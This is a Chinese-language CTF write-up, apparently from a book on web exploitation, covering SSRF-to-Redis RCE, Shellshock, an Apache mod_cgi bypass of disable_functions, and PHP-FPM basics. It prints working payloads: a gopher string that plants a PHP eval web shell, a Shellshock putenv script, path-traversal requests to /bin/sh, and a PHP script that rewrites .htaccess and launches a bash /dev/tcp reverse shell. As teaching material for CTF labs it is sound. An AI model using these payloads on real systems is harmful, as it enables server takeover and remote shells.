<p><img alt="" src="https://pic1.imgdb.cn/item/687f5e2858cb8da5c8cb609a.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-34.md -->
<h3 id="redis-rce">Redis 协议 RCE<a class="headerlink" href="#redis-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f73f558cb8da5c8cb6ab6.png"></p>
<h4 id="1-ssrf-redis">1️⃣ SSRF 与 Redis 结合的核心思路<a class="headerlink" href="#1-ssrf-redis" title="Permanent link">¶</a></h4>
<p>利用 <strong>SSRF</strong>（Server-Side Request Forgery，服务端请求伪造），让服务器主动去请求攻击者指定的 Redis 服务（或内网未授权的 Redis 服务），并向 Redis 写入恶意 payload，从而进一步实现 <strong>远程命令执行（RCE）</strong></p>
<p><strong>2️⃣ SSRF Redis RCE 常见利用链</strong></p>
<table>
<thead>
<tr>
<th>阶段</th>
<th>动作</th>
</tr>
</thead>
<tbody>
<tr>
<td>第一步</td>
<td>SSRF 控制目标服务请求 Redis（通常使用 <code>gopher://</code> 协议，可以伪造 TCP payload）</td>
</tr>
<tr>
<td>第二步</td>
<td>向 Redis 发送写入命令，修改其配置，如 <code>dir</code> 和 <code>dbfilename</code></td>
</tr>
<tr>
<td>第三步</td>
<td>向 Redis 写入 <strong>恶意 SSH 公钥</strong> 或 <strong>计划任务脚本</strong> 到 Web 根目录或 <code>.ssh/authorized_keys</code></td>
</tr>
<tr>
<td>第四步</td>
<td>触发 Redis 保存（<code>SAVE</code>），将 payload 写入磁盘，造成任意代码执行或提权</td>
</tr>
</tbody>
</table>
<p>本题依然可以使用 gopherus 实施攻击</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f797258cb8da5c8cb7bc1.png"></p>
<p>再 URL 编码一次</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f78d458cb8da5c8cb6d16.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-35.md -->
<h3 id="shellshock">Shellshock 提权<a class="headerlink" href="#shellshock" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68808a9a58cb8da5c8ce58fc.png"></p>
<p><strong>漏洞本质</strong></p>
<p>Bash 在处理 “函数定义” 的环境变量时会**继续执行函数体后多余的字符串内容**，即使它不是合法的函数定义</p>
<p><strong>✅ 1. 正常的函数环境变量行为（示例）</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>env<span class="w"> </span><span class="s1">'foo=() { echo hello; }'</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"echo done"</span>
<a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>
<a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a><span class="c1"># `foo` 被定义成一个函数，Bash 会正常识别它</span>
</code></pre></div>
<p><strong>❌ 2. 漏洞触发示例（Shellshock Payload）</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>env<span class="w"> </span><span class="s1">'foo=() { :;}; echo vulnerable'</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"echo test"</span>
<a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>
<a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a><span class="c1"># foo=() { :;}; echo vulnerable 看起来像一个函数定义：</span>
<a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a><span class="w">    </span><span class="c1"># foo=() { :;} 是合法函数定义（:; 是 NOP）</span>
<a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a><span class="w">    </span><span class="c1"># 但后续跟着 ; echo vulnerable，却被 Bash 误当作要执行的代码</span>
<a id="__codelineno-75-6" name="__codelineno-75-6" href="#__codelineno-75-6"></a><span class="c1"># bash -c "echo test" 本意是执行 echo test，但由于 Bash 解析 foo 时“附带执行”了 echo vulnerable </span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="c1"># 输出</span>
<a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>vulnerable
<a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="nb">test</span>
</code></pre></div>
<p>网页给出了后门密码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68808da958cb8da5c8ce8c17.png"></p>
<p>蚁剑直接连接</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68808dc458cb8da5c8ce8e5f.png"></p>
<p>构造 RCE 代码，<a href="https://a1andns.github.io/post/CTFHUB%E6%8A%80%E8%83%BD%E6%A0%91WEB%E8%BF%9B%E9%98%B6">参考博客</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>   <span class="c1"># putenv() 用于设置环境变量</span>
<a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>   <span class="nb">putenv</span><span class="p">(</span><span class="s2">"PHP_test=() { :; }; tac /flag &gt;&gt; /var/www/html/a1andns"</span><span class="p">);</span>
<a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>   <span class="nb">error_log</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="nx">。</span>
<a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a>   <span class="k">echo</span> <span class="s1">'ok'</span><span class="p">;</span><span class="c1">// 便于判断是否运行成功</span>
<a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>右键上传文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68808f3458cb8da5c8ceac2f.png"></p>
<p>浏览器访问出现 OK</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6880907958cb8da5c8cebe76.png"></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/688090ae58cb8da5c8cec113.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-36.md -->
<h3 id="apache-mod-cgi">Apache Mod CGI 提权<a class="headerlink" href="#apache-mod-cgi" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68809d6b58cb8da5c8cf8da8.png"></p>
<p>当 Apache 配置中启用了以下内容时：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>&lt;Directory<span class="w"> </span>/&gt;
<a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="w">    </span><span class="c1"># 表示允许所有用户（包括匿名用户）访问此目录及其子目录，没有任何限制</span>
<a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="w">    </span>Require<span class="w"> </span>all<span class="w"> </span>granted
<a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a>&lt;/Directory&gt;
</code></pre></div>
<p>再配合 <code>mod_cgi</code> 模块，攻击者可以构造特殊的 URL 请求，如：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>GET<span class="w"> </span>/cgi-bin/.%2e/.%2e/bin/sh<span class="w"> </span>HTTP/1.1
<a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>Host:<span class="w"> </span>victim.com
</code></pre></div>
<p><code>%2e</code> 是 URL 编码的 <code>.</code>，这导致路径解析出错，绕过了限制</p>
<p>利用该路径访问系统中的 <code>sh</code> 或其他解释器，附带参数来执行任意命令</p>
<p>例如：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>POST<span class="w"> </span>/cgi-bin/.%2e/.%2e/bin/sh<span class="w"> </span>HTTP/1.1
<a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>Host:<span class="w"> </span>vulnerable.com
<a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>Content-Length:<span class="w"> </span><span class="m">46</span>
<a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a>Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
<a id="__codelineno-80-5" name="__codelineno-80-5" href="#__codelineno-80-5"></a>
<a id="__codelineno-80-6" name="__codelineno-80-6" href="#__codelineno-80-6"></a>echo<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Content-Type: text/plain"</span><span class="p">;</span><span class="w"> </span>echo<span class="p">;</span><span class="w"> </span>id
</code></pre></div>
<p>输出将是 CGI 响应中的用户身份，即已执行系统命令</p>
<p>当你在 <code>php.ini</code> 中配置：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="na">disable_functions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">system, exec, shell_exec, passthru</span>
</code></pre></div>
<p>这只是让 PHP 解释器在运行 <code>.php</code> 脚本时**不允许调用这些函数**，防止 PHP 代码执行系统命令</p>
<p>⚠️ 但前提是——<strong>必须通过 PHP 来运行的代码才会受这个配置限制</strong></p>
<p>当你启用了 Apache 的 <code>mod_cgi</code> 模块后，它的工作方式是：</p>
<ul>
<li>用户请求 <code>example.com/cgi-bin/exploit.sh</code></li>
<li>Apache 检查该文件是可执行文件（比如 <code>/bin/sh</code> 脚本）</li>
<li>Apache 启动新子进程，直接使用操作系统运行该脚本（不是交给 PHP）</li>
</ul>
<p>这时，<strong>不会加载 PHP，也不会执行 <code>php.ini</code> 的配置逻辑</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>正常 PHP RCE 情况下：
<a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>浏览器 --&gt; Apache --&gt; PHP --&gt; 你的脚本
<a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>                            |
<a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>                            └→ system(), 被 disable_functions 禁用
<a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a>
<a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>而 mod_cgi 情况下：
<a id="__codelineno-82-7" name="__codelineno-82-7" href="#__codelineno-82-7"></a>浏览器 --&gt; Apache --&gt; 直接执行 /bin/sh（绕过 PHP）
<a id="__codelineno-82-8" name="__codelineno-82-8" href="#__codelineno-82-8"></a>                        |
<a id="__codelineno-82-9" name="__codelineno-82-9" href="#__codelineno-82-9"></a>                        └→ 任意命令被执行（无任何语言级限制）
</code></pre></div>
<p>点击重置后门目录</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6880c70658cb8da5c8d0dde5.png"></p>
<p>点击 GetFlag 进入到后门，默认 index.php</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6880c73d58cb8da5c8d0df4c.png"></p>
<p>右键插件选择好对应的模式</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6880c7b558cb8da5c8d0e21f.png"></p>
<p>点击开始后如果条件没问题就会弹终端出来</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6880cc5958cb8da5c8d0f78a.png"></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6880cd1958cb8da5c8d0fab5.png"></p>
<p>手动的话需要先上传一个 <code>.htaccess</code> 文件，<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18188088">参考博客</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a># 允许当前目录中的 CGI（Common Gateway Interface）脚本被执行
<a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>Options +ExecCGI
<a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>
<a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a># 将所有以 .eddie 结尾的文件视为 CGI 脚本（可执行文件）
<a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a># 即用户访问 example.com/script.eddie 时，Apache 会尝试执行它而不是当作普通文件输出
<a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a>AddHandler cgi-script .eddie
</code></pre></div>
<p>反弹 shell 的 <code>shell.eddie</code> 文件</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="ch">#!/bin/bash</span>
<a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="c1"># 输出 HTTP 响应头，告知浏览器这是 HTML 内容</span>
<a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"Content-Type: text/html\n\n"</span>
<a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a>
<a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a><span class="c1"># 执行 ls 命令列出当前目录，并用 echo 输出</span>
<a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a><span class="nb">echo</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ls
</code></pre></div>
<p><code>eddie.php</code> 文件</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="c1">// 要执行的反弹 shell 命令（将 bash shell 连接到远程 VPS 的指定端口）</span>
<a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1"</span><span class="p">;</span>
<a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a>
<a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a><span class="c1">// 创建 CGI 脚本的内容（bash 脚本）</span>
<a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a><span class="nv">$shellfile</span> <span class="o">=</span> <span class="s2">"#!/bin/bash</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 指定使用 bash 解释器</span>
<a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a><span class="nv">$shellfile</span> <span class="o">.=</span> <span class="s2">"echo -ne </span><span class="se">\"</span><span class="s2">Content-Type: text/html</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 输出 HTTP 响应头，防止服务器抛出 500 错误</span>
<a id="__codelineno-85-8" name="__codelineno-85-8" href="#__codelineno-85-8"></a><span class="nv">$shellfile</span> <span class="o">.=</span> <span class="s2">"</span><span class="si">$cmd</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 添加反弹 shell 命令到脚本中</span>
<a id="__codelineno-85-9" name="__codelineno-85-9" href="#__codelineno-85-9"></a>
<a id="__codelineno-85-10" name="__codelineno-85-10" href="#__codelineno-85-10"></a><span class="c1">// 输出检查结果的函数（是否满足条件）</span>
<a id="__codelineno-85-11" name="__codelineno-85-11" href="#__codelineno-85-11"></a><span class="k">function</span> <span class="nf">checkEnabled</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$condition</span><span class="p">,</span> <span class="nv">$yes</span><span class="p">,</span> <span class="nv">$no</span><span class="p">)</span>
<a id="__codelineno-85-12" name="__codelineno-85-12" href="#__codelineno-85-12"></a><span class="p">{</span>
<a id="__codelineno-85-13" name="__codelineno-85-13" href="#__codelineno-85-13"></a>    <span class="k">echo</span> <span class="s2">"</span><span class="si">$text</span><span class="s2">: "</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$condition</span> <span class="o">?</span> <span class="nv">$yes</span> <span class="o">:</span> <span class="nv">$no</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 根据条件输出结果</span>
<a id="__codelineno-85-14" name="__codelineno-85-14" href="#__codelineno-85-14"></a><span class="p">}</span>
<a id="__codelineno-85-15" name="__codelineno-85-15" href="#__codelineno-85-15"></a>
<a id="__codelineno-85-16" name="__codelineno-85-16" href="#__codelineno-85-16"></a><span class="c1">// 如果没有设置 ?checked=true 参数，则首次访问时进入该分支</span>
<a id="__codelineno-85-17" name="__codelineno-85-17" href="#__codelineno-85-17"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'checked'</span><span class="p">]))</span>
<a id="__codelineno-85-18" name="__codelineno-85-18" href="#__codelineno-85-18"></a><span class="p">{</span>
<a id="__codelineno-85-19" name="__codelineno-85-19" href="#__codelineno-85-19"></a>    <span class="c1">// 向当前目录下的 .htaccess 文件添加一行 SetEnv 指令（检测是否允许使用 .htaccess）</span>
<a id="__codelineno-85-20" name="__codelineno-85-20" href="#__codelineno-85-20"></a>    <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'.htaccess'</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">SetEnv HTACCESS on"</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
<a id="__codelineno-85-21" name="__codelineno-85-21" href="#__codelineno-85-21"></a>
<a id="__codelineno-85-22" name="__codelineno-85-22" href="#__codelineno-85-22"></a>    <span class="c1">// 重定向到自身，加上 ?checked=true 参数，进入下一阶段检测</span>
<a id="__codelineno-85-23" name="__codelineno-85-23" href="#__codelineno-85-23"></a>    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: '</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'?checked=true'</span><span class="p">);</span>
<a id="__codelineno-85-24" name="__codelineno-85-24" href="#__codelineno-85-24"></a><span class="p">}</span>
<a id="__codelineno-85-25" name="__codelineno-85-25" href="#__codelineno-85-25"></a><span class="k">else</span>
<a id="__codelineno-85-26" name="__codelineno-85-26" href="#__codelineno-85-26"></a><span class="p">{</span>
<a id="__codelineno-85-27" name="__codelineno-85-27" href="#__codelineno-85-27"></a>    <span class="c1">// 检查服务器是否启用了 mod_cgi 模块</span>
<a id="__codelineno-85-28" name="__codelineno-85-28" href="#__codelineno-85-28"></a>    <span class="nv">$modcgi</span> <span class="o">=</span> <span class="nb">in_array</span><span class="p">(</span><span class="s1">'mod_cgi'</span><span class="p">,</span> <span class="nb">apache_get_modules</span><span class="p">());</span>
<a id="__codelineno-85-29" name="__codelineno-85-29" href="#__codelineno-85-29"></a>
<a id="__codelineno-85-30" name="__codelineno-85-30" href="#__codelineno-85-30"></a>    <span class="c1">// 检查当前目录是否有写权限</span>
<a id="__codelineno-85-31" name="__codelineno-85-31" href="#__codelineno-85-31"></a>    <span class="nv">$writable</span> <span class="o">=</span> <span class="nb">is_writable</span><span class="p">(</span><span class="s1">'.'</span><span class="p">);</span>
<a id="__codelineno-85-32" name="__codelineno-85-32" href="#__codelineno-85-32"></a>
<a id="__codelineno-85-33" name="__codelineno-85-33" href="#__codelineno-85-33"></a>    <span class="c1">// 检查 .htaccess 文件是否生效（通过前面写入的 SetEnv 决定）</span>
<a id="__codelineno-85-34" name="__codelineno-85-34" href="#__codelineno-85-34"></a>    <span class="nv">$htaccess</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTACCESS'</span><span class="p">]);</span>
<a id="__codelineno-85-35" name="__codelineno-85-35" href="#__codelineno-85-35"></a>
<a id="__codelineno-85-36" name="__codelineno-85-36" href="#__codelineno-85-36"></a>    <span class="c1">// 显示三个条件的检测结果</span>
<a id="__codelineno-85-37" name="__codelineno-85-37" href="#__codelineno-85-37"></a>    <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">"Mod-Cgi 是否启用"</span><span class="p">,</span> <span class="nv">$modcgi</span><span class="p">,</span> <span class="s2">"是"</span><span class="p">,</span> <span class="s2">"否"</span><span class="p">);</span>
<a id="__codelineno-85-38" name="__codelineno-85-38" href="#__codelineno-85-38"></a>    <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">"当前目录是否可写"</span><span class="p">,</span> <span class="nv">$writable</span><span class="p">,</span> <span class="s2">"是"</span><span class="p">,</span> <span class="s2">"否"</span><span class="p">);</span>
<a id="__codelineno-85-39" name="__codelineno-85-39" href="#__codelineno-85-39"></a>    <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">".htaccess 是否生效"</span><span class="p">,</span> <span class="nv">$htaccess</span><span class="p">,</span> <span class="s2">"是"</span><span class="p">,</span> <span class="s2">"否"</span><span class="p">);</span>
<a id="__codelineno-85-40" name="__codelineno-85-40" href="#__codelineno-85-40"></a>
<a id="__codelineno-85-41" name="__codelineno-85-41" href="#__codelineno-85-41"></a>    <span class="c1">// 如果有任一条件不满足，则退出执行</span>
<a id="__codelineno-85-42" name="__codelineno-85-42" href="#__codelineno-85-42"></a>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$modcgi</span> <span class="o">&amp;&amp;</span> <span class="nv">$writable</span> <span class="o">&amp;&amp;</span> <span class="nv">$htaccess</span><span class="p">))</span>
<a id="__codelineno-85-43" name="__codelineno-85-43" href="#__codelineno-85-43"></a>    <span class="p">{</span>
<a id="__codelineno-85-44" name="__codelineno-85-44" href="#__codelineno-85-44"></a>        <span class="k">echo</span> <span class="s2">"错误：上述所有条件都必须满足脚本才可工作！"</span><span class="p">;</span>
<a id="__codelineno-85-45" name="__codelineno-85-45" href="#__codelineno-85-45"></a>    <span class="p">}</span>
<a id="__codelineno-85-46" name="__codelineno-85-46" href="#__codelineno-85-46"></a>    <span class="k">else</span>
<a id="__codelineno-85-47" name="__codelineno-85-47" href="#__codelineno-85-47"></a>    <span class="p">{</span>
<a id="__codelineno-85-48" name="__codelineno-85-48" href="#__codelineno-85-48"></a>        <span class="c1">// 备份 .htaccess 文件（以防出错）</span>
<a id="__codelineno-85-49" name="__codelineno-85-49" href="#__codelineno-85-49"></a>        <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">"备份 .htaccess 文件"</span><span class="p">,</span> <span class="nb">copy</span><span class="p">(</span><span class="s2">".htaccess"</span><span class="p">,</span> <span class="s2">".htaccess.bak"</span><span class="p">),</span> <span class="s2">"成功！已保存为 .htaccess.bak"</span><span class="p">,</span> <span class="s2">"失败！"</span><span class="p">);</span>
<a id="__codelineno-85-50" name="__codelineno-85-50" href="#__codelineno-85-50"></a>
<a id="__codelineno-85-51" name="__codelineno-85-51" href="#__codelineno-85-51"></a>        <span class="c1">// 写入新的 .htaccess 内容：启用 ExecCGI，并将 .dizzle 后缀当作 CGI 脚本处理</span>
<a id="__codelineno-85-52" name="__codelineno-85-52" href="#__codelineno-85-52"></a>        <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">"写入 .htaccess 文件"</span><span class="p">,</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'.htaccess'</span><span class="p">,</span> <span class="s2">"Options +ExecCGI</span><span class="se">\n</span><span class="s2">AddHandler cgi-script .dizzle"</span><span class="p">),</span> <span class="s2">"成功！"</span><span class="p">,</span> <span class="s2">"失败！"</span><span class="p">);</span>
<a id="__codelineno-85-53" name="__codelineno-85-53" href="#__codelineno-85-53"></a>
<a id="__codelineno-85-54" name="__codelineno-85-54" href="#__codelineno-85-54"></a>        <span class="c1">// 写入反弹 shell 脚本，扩展名为 .dizzle（便于伪装或绕过上传限制）</span>
<a id="__codelineno-85-55" name="__codelineno-85-55" href="#__codelineno-85-55"></a>        <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">"写入 shell 文件"</span><span class="p">,</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'shell.dizzle'</span><span class="p">,</span> <span class="nv">$shellfile</span><span class="p">),</span> <span class="s2">"成功！"</span><span class="p">,</span> <span class="s2">"失败！"</span><span class="p">);</span>
<a id="__codelineno-85-56" name="__codelineno-85-56" href="#__codelineno-85-56"></a>
<a id="__codelineno-85-57" name="__codelineno-85-57" href="#__codelineno-85-57"></a>        <span class="c1">// 将 shell.dizzle 文件设置为 777 权限（可执行）</span>
<a id="__codelineno-85-58" name="__codelineno-85-58" href="#__codelineno-85-58"></a>        <span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">"设置权限为 777"</span><span class="p">,</span> <span class="nb">chmod</span><span class="p">(</span><span class="s2">"shell.dizzle"</span><span class="p">,</span> <span class="mo">0777</span><span class="p">),</span> <span class="s2">"成功！"</span><span class="p">,</span> <span class="s2">"失败！"</span><span class="p">);</span>
<a id="__codelineno-85-59" name="__codelineno-85-59" href="#__codelineno-85-59"></a>
<a id="__codelineno-85-60" name="__codelineno-85-60" href="#__codelineno-85-60"></a>        <span class="c1">// 触发 shell 脚本的执行（通过 img 标签加载 shell.dizzle，但不显示）</span>
<a id="__codelineno-85-61" name="__codelineno-85-61" href="#__codelineno-85-61"></a>        <span class="k">echo</span> <span class="s2">"正在执行脚本，请检查你的监听端口 &lt;img src='shell.dizzle' style='display:none;'&gt;"</span><span class="p">;</span>
<a id="__codelineno-85-62" name="__codelineno-85-62" href="#__codelineno-85-62"></a>    <span class="p">}</span>
<a id="__codelineno-85-63" name="__codelineno-85-63" href="#__codelineno-85-63"></a><span class="p">}</span>
<a id="__codelineno-85-64" name="__codelineno-85-64" href="#__codelineno-85-64"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>扔到 <code>backdoor</code> 目录下面，再直接访问 <code>eddie.php</code></p>
<p>会在目录下生成 <code>shell.dizzle</code>，再访问 <code>shell.dizzle</code> 就可以成功反弹 shell</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68818c0958cb8da5c8d2a119.png"></p>
<p>访问 <code>eddie.php</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68818cc858cb8da5c8d2aceb.png"></p>
<p>蚁剑中刷新目录可以看到执行成功，多出两个文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68818dec58cb8da5c8d2c296.png"></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68818e0d58cb8da5c8d2c341.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-37.md -->
<h3 id="php-fpm">PHP-FPM 提权<a class="headerlink" href="#php-fpm" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881909e58cb8da5c8d2efa3.png"></p>
<p><strong>PHP-FPM</strong>（<strong>FastCGI Process Manager</strong>）是 PHP 的一种运行方式，专门用来提高 <strong>PHP 在高并发 Web 环境中的性能和稳定性</strong></p>
<p>它负责 <strong>管理多个 PHP 进程</strong>，接收 Web 服务器（如 Nginx）发来的请求，交给 PHP 解析，然后把结果返回给 Web 服务器</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>用户浏览器
<a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>     ↓
<a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>   Nginx
<a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>     ↓ FastCGI（通过 Unix socket 或 TCP）
<a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a> PHP-FPM
<a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a>     ↓
<a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a>   PHP代码
</code></pre></div>
<p>配置文件位置</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>/etc/php/7.x/fpm/php-fpm.conf
<a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>/etc/php/7.x/fpm/pool.d/www.conf
